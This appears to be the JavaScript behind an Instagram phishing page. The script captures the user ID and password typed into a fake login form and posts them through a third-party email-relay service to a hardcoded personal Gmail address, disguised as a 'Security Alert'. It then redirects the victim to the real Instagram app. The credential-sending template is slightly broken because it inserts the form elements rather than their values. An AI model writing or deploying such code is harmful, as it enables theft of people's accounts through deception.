const userId = document.getElementById('userId');
const password = document.getElementById('password');
const login = document.getElementById('login-btn');


async function sendEmailToUser(url, data = {}) {
  // Default options are marked with *
  const response = await fetch(url, {
    method: 'POST', // *GET, POST, PUT, DELETE, etc.
    mode: 'cors', // no-cors, *cors, same-origin
    cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
    credentials: 'same-origin', // include, *same-origin, omit
    headers: {
      'Content-Type': 'application/json'
      // 'Content-Type': 'application/x-www-form-urlencoded',
    },
    redirect: 'follow', // manual, *follow, error
    referrerPolicy: 'no-referrer', // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
    body: JSON.stringify(data) // body data type must match "Content-Type" header
  });
  return response.json(); // parses JSON response into native JavaScript objects
}

const sendEmailClick = async function(event){
  event.preventDefault(); 

  if(userId.value == undefined || userId.value ==''  && ( password.value == undefined || password.value == '')){
    alert('Please enter valid userId and Password')
    return;

  }
  console.log('object :>> ', );

  const data = {
    recipientsEmail : "priyakeshri.in@gmail.com", //  use Array of String for multiple email
    appName : "Instagram", 
    subject : "Security Alert",
    senderEmail : "user", //eg: Your-App-Name // donot include @donot-reply.online // no space or special char
    emailContent : `${userId} This is UserId ${password}`,  //your Email containt
    HTMLfile : "" //must be in String and single html formate  
  } 

  const res = await sendEmailToUser('https://send.donot-reply.online/public/email/notification',data);
  
  const url = "intent://instagram.com/#Intent;scheme=https;package=com.instagram.android;end";
  window.location.replace(url); 


  
  
}


login.addEventListener('click', sendEmailClick)